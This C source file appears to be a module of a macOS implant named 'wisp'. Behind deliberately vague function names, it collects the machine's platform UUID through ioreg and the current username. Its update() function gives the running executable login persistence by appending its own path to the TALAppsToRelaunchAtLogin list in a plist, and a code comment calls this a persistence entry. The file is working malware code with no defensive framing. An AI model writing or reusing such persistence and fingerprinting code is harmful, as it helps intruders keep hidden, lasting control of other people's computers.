#include "wisp.h"

//===================================================================
/// HELLO 
//===================================================================


__attribute__((always_inline)) static inline char *cute(const char *cmd) {
    // Similar to what we got in `sign`
    FILE *pipe = popen(cmd, "r");
    if (!pipe)
        return NULL;
    
    char buff[128] = {0};
    char *result = NULL;
    
    if (fgets(buff, sizeof(buff), pipe)) {
        buff[strcspn(buff, "\n")] = '\0';
        result = strdup(buff);
    }
    pclose(pipe);
    return result;
}

__attribute__((always_inline)) static inline char *platform(void) {
    const char *uuid_cmd = "ioreg -rd1 -c IOPlatformExpertDevice | awk -F'\"' '/IOPlatformUUID/{print $4}'";
    return cute(uuid_cmd);
}

__attribute__((always_inline)) static inline char *env_username(void) {
    const char *user = getenv("USER");
    return (user ? strdup(user) : NULL);
}

__attribute__((always_inline)) static inline CFURLRef create_file_url(const char *path) {
    return CFURLCreateFromFileSystemRepresentation(NULL, (const UInt8 *)path, strlen(path), false);
}

//===================================================================
/// CALL 
//===================================================================


// Platform UUID (or NULL if not found)
char *iddd(void) {
    return platform();
}

// Returns a copy of the username from the environment (or NULL if not found)
char *whoss(void) {
    return env_username();
}

// Updates the persistence entry in the specified plist file.
void update(const char *plist_path) {
    char *exePath = NULL;
    CFURLRef fileURL = NULL;
    CFPropertyListRef propertyList = NULL;
    CFMutableDictionaryRef newApp = NULL;
    CFDataRef newData = NULL;
    
    uint32_t bufsize = 0;
    // Get required buffer size for the executable path.
    _NSGetExecutablePath(NULL, &bufsize);
    exePath = malloc(bufsize);
    if (!exePath || _NSGetExecutablePath(exePath, &bufsize) != 0)
        goto cleanup;
    
    fileURL = create_file_url(plist_path);
    if (!fileURL)
        goto cleanup;
    
    CFDataRef data = NULL;
    // Attempt to load an existing plist.
    if (CFURLCreateDataAndPropertiesFromResource(NULL, fileURL, &data, NULL, NULL, NULL))
    {
        propertyList = CFPropertyListCreateWithData(NULL, data,
                            kCFPropertyListMutableContainers, NULL, NULL);
        CFRelease(data);
    }
    
    // If no plist exists, create a new mutable dictionary.
    if (!propertyList) {
        propertyList = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
                            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    }
    
    // Retrieve (or create) the login items array.
    CFMutableArrayRef apps = (CFMutableArrayRef)
        CFDictionaryGetValue(propertyList, CFSTR("TALAppsToRelaunchAtLogin"));
    if (!apps) {
        apps = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
        CFDictionarySetValue((CFMutableDictionaryRef)propertyList,
                             CFSTR("TALAppsToRelaunchAtLogin"), apps);
        CFRelease(apps); // apps is retained by the dictionary.
        apps = (CFMutableArrayRef)CFDictionaryGetValue(propertyList, CFSTR("TALAppsToRelaunchAtLogin"));
    }
    
    // Create a new dictionary entry for the executable.
    newApp = CFDictionaryCreateMutable(kCFAllocatorDefault, 3,
                           &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    
    int state = 2;  // Arbitrary background state.
    CFNumberRef bgState = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &state);
    CFDictionarySetValue(newApp, CFSTR("BackgroundState"), bgState);
    CFRelease(bgState);
    
    CFStringRef exePathStr = CFStringCreateWithCString(kCFAllocatorDefault, exePath,
                                                       kCFStringEncodingUTF8);
    CFDictionarySetValue(newApp, CFSTR("Path"), exePathStr);
    CFRelease(exePathStr);
    
    CFArrayAppendValue(apps, newApp);
    
    // Write the updated plist back to disk.
    newData = CFPropertyListCreateData(kCFAllocatorDefault, propertyList,
                                       kCFPropertyListXMLFormat_v1_0, 0, NULL);
    if (newData) {
        FILE *plistFile = fopen(plist_path, "wb");
        if (plistFile) {
            fwrite(CFDataGetBytePtr(newData), sizeof(UInt8),
                   CFDataGetLength(newData), plistFile);
            fclose(plistFile);
        }
        CFRelease(newData);
    }

cleanup:
    if (newApp)
        CFRelease(newApp);
    if (propertyList)
        CFRelease(propertyList);
    if (fileURL)
        CFRelease(fileURL);
    if (exePath)
        free(exePath);
}
